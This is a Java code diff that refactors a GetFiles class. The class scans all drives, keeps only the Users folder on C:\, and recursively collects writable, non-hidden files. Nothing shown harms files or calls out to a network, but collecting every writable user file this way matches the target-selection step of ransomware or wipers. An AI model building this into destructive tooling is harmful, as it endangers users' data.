@@ -6,7 +6,7 @@ import java.util.Arrays;
 import java.util.Objects;
 
 public class GetFiles {
-    private final File[] drivers;
+    private File[] drivers;
 
     public GetFiles() {
         drivers = scanDrivers();
@@ -25,7 +25,6 @@ public class GetFiles {
 
         int i = 0;
         boolean isEnd = false;
-        boolean isDir = false;
         boolean isSystemDrive = (drive.toString().equals("C:\\"));
         if (isSystemDrive) {
             // delete files system
@@ -33,26 +32,23 @@ public class GetFiles {
                 if (!files.get(n).getName().equals("Users"))
                     files.remove(n--);
         }
+        loo:
         do {
             File file = files.get(i);
-            if (file.canRead() && file.canWrite()) {
-                if (!file.isHidden()) {
-                    if (file.listFiles() != null) {
-                        files.remove(i);
-                        files.addAll(i, Arrays.asList(file.listFiles()));
-                        isDir = true;
-                    } else {
-                        files.remove(i);
-                    }
+            while (file.isDirectory()) {
+                if (file.canWrite() && !file.isHidden() && file.listFiles() != null) {
+                    files.remove(i);
+                    files.addAll(i, Arrays.asList(file.listFiles()));
+                    file = files.get(i);
                 } else {
                     files.remove(i);
+                    if (i < files.size())
+                        file = files.get(i);
+                    else
+                        break loo;
                 }
             }
-            if (isDir) {
-                isDir = false;
-            }
-            i++;
-            isEnd = files.size() == i;
+            isEnd = files.size() <= ++i;
         } while (!isEnd);
 
         // Delete directories and can't write files
